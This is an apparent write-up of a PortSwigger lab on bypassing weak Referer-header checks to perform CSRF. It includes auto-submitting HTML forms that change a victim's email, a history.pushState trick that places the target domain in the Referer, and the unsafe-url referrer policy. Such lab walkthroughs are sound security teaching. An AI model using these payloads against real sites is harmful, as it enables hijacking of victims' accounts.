
# CSRF with broken Referer validation

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses



![img](images/CSRF%20with%20broken%20Referer%20validation/1.png)

---------------------------------------------

There is a function to update the email:



![img](images/CSRF%20with%20broken%20Referer%20validation/2.png)


It is a POST request:



![img](images/CSRF%20with%20broken%20Referer%20validation/3.png)


This is the CSRF PoC:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

When opened, it returns this error:



![img](images/CSRF%20with%20broken%20Referer%20validation/4.png)


This is because the “Referer” HTTP header contains the domain of the exploit server:



![img](images/CSRF%20with%20broken%20Referer%20validation/5.png)



But we can change the domain of Referer to anything as long as the domain is included in that value:

```
http://attacker-website.com/csrf-attack?0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/
```



![img](images/CSRF%20with%20broken%20Referer%20validation/6.png)



It is necessary to update “history.pushState” in the CSRF PoC and add the vulnerable domain as a parameter of the url:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2c007d0457217b8686cbaf0006004c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test3&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?0a2c007d0457217b8686cbaf0006004c.web-security-academy.net');
      document.forms[0].submit();
    </script>
  </body>
</html>
```



![img](images/CSRF%20with%20broken%20Referer%20validation/7.png)


And it is also necessary to send a “Referrer-Policy” value of “unsafe-url” in the Head section to send the whole URL in the Referer header:

```
Referrer-Policy: unsafe-url
```

![img](images/CSRF%20with%20broken%20Referer%20validation/8.png)
